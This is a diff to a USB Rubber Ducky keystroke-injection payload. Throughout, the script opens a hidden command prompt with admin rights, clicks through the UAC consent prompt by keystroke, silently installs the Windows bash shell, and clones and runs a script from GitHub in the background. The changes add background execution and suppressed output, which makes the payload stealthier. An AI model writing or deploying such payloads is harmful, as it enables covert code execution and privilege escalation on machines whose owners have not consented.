@@ -37,13 +37,11 @@ REM Start of obfuscation...
 REM Based off instructions found at: https://github.com/hak5darren/USB-Rubber-Ducky/wiki/Payload---generic-batch
 STRING cmd /Q /D /T:7F /F:OFF /V:ON /K
 REM Start of escalated permissions work around
-REM  Instructions from: www.howtogeek.com/howto/windows-vista/run-a-command-as-administrator-from-the-widows-vista-run-box
+REM  Instructions from: http://www.howtogeek.com/howto/windows-vista/run-a-command-as-administrator-from-the-windows-vista-run-box/
 CONTROL SHIFT ENTER
 DELAY 500
 REM Get rid of authentication pop-up
 ALT c
-DELAY 500
-ENTER
 REM End of escalated permissions work around
 REM Remember that we are Admin now.
 DELAY 750
@@ -60,7 +58,9 @@ REM Start of payload...
 REM Write a string into the 'Run' menu command to install Bash without prompt
 REM Based off instructions found at: http://www.howtogeek.com/249966/how-to-install-and-use-the-linux-bash-shell-on-windows-10/
 REM And instructions from: http://www.howtogeek.com/261591/how-to-create-and-run-bash-shell-scripts-on-windows-10/
-STRING lxrun /install /y && bash -c "apt-get update && apt-get install gnupg git && git clone https://github.com/S0AndS0/Perinoid_Pipes && cd Perinoid_Pipes && chmod +x Parinoid_Pipes.sh && ./Parinoid_Pipes.sh --help > help.log"
+REM And instructions from: http://www.howtogeek.com/261449/how-to-install-linux-software-in-windows-10s-ubuntu-bash-shell/
+REM And instructions from: http://superuser.com/questions/198525/how-can-i-execute-a-windows-command-line-in-background
+STRING START "" /B lxrun /install /y && START "" /B bash -c "sudo apt-get update -qqq && sudo apt-get install -yqqq gnupg git && git clone https://github.com/S0AndS0/Perinoid_Pipes && cd Perinoid_Pipes && chmod +x Parinoid_Pipes.sh && ./Parinoid_Pipes.sh --help > help.log" 1>bash_install.log 2>1&
 REM Note everything between above quotes, after the '&&' will be run in the
 REM Bash shell once it has been installed, at the very end where the script
 REM outputs its help to a file will show if this succeeded.
